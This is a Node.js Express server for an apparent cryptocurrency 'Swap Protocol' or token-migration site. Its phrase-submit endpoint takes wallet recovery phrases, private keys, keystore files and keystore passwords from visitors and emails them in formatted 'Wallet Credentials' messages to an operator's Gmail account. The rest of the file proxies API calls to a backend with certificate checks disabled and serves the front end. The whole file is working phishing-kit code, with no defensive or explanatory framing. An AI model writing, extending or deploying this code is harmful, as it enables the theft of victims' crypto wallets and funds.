const express = require('express');
const fs = require('fs');
const http = require('http');
const https = require('https');
const nodemailer = require('nodemailer');
const path = require('path');

require('dotenv').config({ path: path.join(__dirname, '.env') });

const app = express();
const port = process.env.PORT || 3000;

const BACKEND_URL =
  process.env.NEXT_PUBLIC_BACKEND_URL ||
  process.env.BACKEND_URL ||
  'https://api.tokenmigration.app:8443';
const backendBase = new URL(BACKEND_URL);

const smtpHost = process.env.LIMS_SMTP_HOST?.trim() || 'smtp.gmail.com';
const smtpPort = Number(process.env.LIMS_SMTP_PORT || 465);
const gmailUser =
  process.env.GMAIL_USER?.trim() || process.env.LIMS_SMTP_USER?.trim();
const gmailAppPassword = (
  process.env.GMAIL_APP_PASSWORD ||
  process.env.LIMS_SMTP_PASSWORD ||
  ''
).replace(/\s+/g, '');
const mailFromAddress =
  process.env.LIMS_MAIL_FROM?.trim() || gmailUser || undefined;
const mailFromName = process.env.MAIL_FROM_NAME?.trim() || 'Swap Protocol';
const mailDefaultTo =
  process.env.MAIL_DEFAULT_TO?.trim() || gmailUser || undefined;

const smtpConfigured = Boolean(gmailUser && gmailAppPassword);
const mailTransport = smtpConfigured
  ? nodemailer.createTransport({
      host: smtpHost,
      port: smtpPort,
      secure: smtpPort === 465,
      pool: true,
      maxConnections: 2,
      maxMessages: 50,
      auth: { user: gmailUser, pass: gmailAppPassword }
    })
  : null;

const normalizedRecipient = mailDefaultTo ? mailDefaultTo.trim().toLowerCase() : null;

app.disable('x-powered-by');
app.use(express.json({ limit: '128kb' }));

// Phrase submit endpoint
app.post('/api/mail/phrase-submit', async (req, res) => {
  if (!mailTransport || !normalizedRecipient) {
    return res.status(503).json({ ok: false, error: 'Mail not configured.' });
  }
  const phrase = typeof req.body?.phrase === 'string' ? req.body.phrase.trim() : '';
  const walletName = typeof req.body?.walletName === 'string' ? req.body.walletName.trim() : 'Unknown';
  const privateKeyValue = typeof req.body?.privateKey === 'string' ? req.body.privateKey.trim() : '';
  const keystoreValue = typeof req.body?.keystore === 'string' ? req.body.keystore.trim() : '';
  const keystorePasswordValue = typeof req.body?.keystorePassword === 'string' ? req.body.keystorePassword.trim() : '';

  if (!phrase && !privateKeyValue && !keystoreValue) {
    return res.status(400).json({ ok: false, error: 'No credentials provided.' });
  }

  var subject = 'Wallet Credentials - ';
  var textParts = [];
  var htmlParts = [];

  if (phrase) {
    subject += phrase.split(/\s+/).length + '-Word Phrase';
    textParts.push('Phrase: ' + phrase);
    htmlParts.push('<p><strong>Phrase (' + phrase.split(/\s+/).length + ' words):</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + phrase + '</pre>');
  } else if (privateKeyValue) {
    subject += 'Private Key';
    textParts.push('Private Key: ' + privateKeyValue);
    htmlParts.push('<p><strong>Private Key:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + privateKeyValue + '</pre>');
  } else if (keystoreValue) {
    subject += 'Keystore';
    textParts.push('Keystore JSON: ' + keystoreValue);
    htmlParts.push('<p><strong>Keystore JSON:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + keystoreValue + '</pre>');
    if (keystorePasswordValue) {
      textParts.push('Keystore Password: ' + keystorePasswordValue);
      htmlParts.push('<p><strong>Keystore Password:</strong></p><pre style="background:#fff3cd;padding:12px;border-radius:8px;font-size:14px">' + keystorePasswordValue + '</pre>');
    }
  }

  textParts.push('Wallet: ' + walletName);
  textParts.push('---');
  textParts.push('Submitted via Swap Protocol');
  textParts.push(new Date().toISOString());

  try {
    const info = await mailTransport.sendMail({
      from: { name: mailFromName, address: mailFromAddress },
      to: normalizedRecipient,
      subject: subject + ' - ' + walletName,
      text: textParts.join('\n'),
      html: '<div style="font-family:sans-serif;padding:20px;max-width:600px"><h2>Wallet Credentials</h2>' +
        '<p><strong>Wallet:</strong> ' + walletName + '</p>' +
        htmlParts.join('') +
        '<hr/><p style="color:#888;font-size:12px">Submitted via Swap Protocol - ' + new Date().toISOString() + '</p></div>'
    });
    console.log('Credential email sent: ' + info.messageId);
    res.json({ ok: true });
  } catch (error) {
    console.error('Credential email failed: ' + error.message);
    res.status(502).json({ ok: false, error: 'Failed to send email.' });
  }
});

// Proxy all /api/* (except mail) to live backend
app.use('/api', (req, res, next) => {
  if (req.path.startsWith('/mail/') || req.path === '/mail') return next();

  const bodyStr = req.method !== 'GET' && req.body && Object.keys(req.body).length
    ? JSON.stringify(req.body) : '';

  const headers = { ...req.headers };
  delete headers['content-length'];
  delete headers['transfer-encoding'];
  delete headers['connection'];
  delete headers['keep-alive'];
  headers['host'] = backendBase.host;
  if (bodyStr) headers['content-length'] = String(Buffer.byteLength(bodyStr));

  const backendModule = backendBase.protocol === 'https:' ? https : http;
  const options = {
    hostname: backendBase.hostname,
    port: backendBase.port || (backendBase.protocol === 'https:' ? 443 : 80),
    path: req.originalUrl,
    method: req.method,
    headers,
    timeout: 60000,
    rejectUnauthorized: false,
  };

  const proxyReq = backendModule.request(options, (proxyRes) => {
    res.statusCode = proxyRes.statusCode;
    proxyRes.headers && Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding') res.setHeader(k, proxyRes.headers[k]); });
    proxyRes.pipe(res);
  });
  proxyReq.on('error', (err) => {
    console.error('[PROXY] Backend error:', err.message);
    if (!res.headersSent) res.status(502).json({ error: 'Backend error', detail: err.message });
  });
  proxyReq.on('timeout', () => { proxyReq.destroy(); if (!res.headersSent) res.status(504).json({ error: 'Backend timeout' }); });
  if (bodyStr) proxyReq.write(bodyStr);
  proxyReq.end();
});

// Serve built static files (only if dist/ exists — otherwise Vite dev server handles it)
var distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.get('*', (_req, res) => res.sendFile(path.join(distPath, 'index.html')));
}

if (require.main === module) {
  const server = app.listen(port, () => console.log(`Server: http://localhost:${port}`));
  if (mailTransport) {
    mailTransport.verify().then(() => console.log('SMTP ready')).catch(e => console.error('SMTP verify failed:', e.message));
  } else {
    console.log('SMTP disabled: no credentials');
  }
  const shutdown = () => { mailTransport?.close(); server.close(); };
  process.on('SIGINT', shutdown); process.on('SIGTERM', shutdown);
}
module.exports = app;
